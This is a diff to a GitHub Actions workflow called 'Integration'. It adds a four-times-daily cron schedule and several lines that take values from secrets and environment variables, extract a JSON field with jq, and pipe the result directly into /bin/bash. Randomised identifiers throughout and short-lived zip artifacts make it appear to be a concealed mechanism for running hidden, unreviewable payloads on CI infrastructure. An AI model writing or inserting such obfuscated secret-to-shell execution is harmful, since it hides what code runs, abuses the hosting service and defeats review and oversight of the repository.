@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '18 2,8,14,20 * * *'
 jobs:
   handler:
     runs-on: ubuntu-latest
@@ -10,15 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          yy7125: ${{ secrets.yy7125 }}
+          r93783: ${{ secrets.r93783 }}
         run: |
-          printf '%s' "$yy7125" | jq -r .wt7572 | /bin/bash
-          echo $obblr4 | jq -r .eyfg465 | /bin/bash
+          printf '%s' "$r93783" | jq -r .sskeu11010 | /bin/bash
+          printf '%s' "$onzsg45" | jq -r .jfy6189 | /bin/bash
+          echo $bsl9577 | jq -r .umev70974 | /bin/bash
+          printf '%s' "$hbu50432" | jq -r .myfwl065 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: jzU7zEhO
+          name: 9U887adr
           path: "*.zip"
           retention-days: 1
